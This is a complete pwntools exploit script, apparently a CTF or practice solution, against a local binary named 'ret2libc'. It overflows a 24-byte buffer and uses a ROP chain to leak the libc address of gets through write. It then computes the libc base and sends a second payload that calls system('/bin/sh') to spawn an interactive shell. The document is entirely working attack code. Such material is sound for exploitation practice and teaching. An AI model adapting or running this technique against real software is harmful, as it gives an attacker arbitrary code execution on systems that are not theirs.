from pwn import *
context.log_level = "debug"
p = process("./ret2libc")
e = ELF("./ret2libc")
w_plt = e.plt["write"]
buf2 = e.symbols["buf2"]
vul = e.symbols["vul"]

gets_got = e.got["gets"]
# 0x0000000000400613 : pop rdi ; ret
# 0x0000000000400611 : pop rsi ; pop r15 ; ret
pop_rdi = 0x400613
pp_rsi = 0x400611
#write(1,buf2,size)
payload = "A"*24+p64(pop_rdi)+p64(1)+p64(pp_rsi)+p64(gets_got)+p64(1)+p64(w_plt)+p64(vul)
p.sendlineafter("hello",payload)

gets = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = gets - libc.symbols["gets"]
sys = libc.symbols["system"]
bin_sh = libc.search("/bin/sh").next()

payload2 = "A"*24+p64(pop_rdi)+p64(bin_sh)+p64(sys)
p.sendline(payload2)
p.interactive()


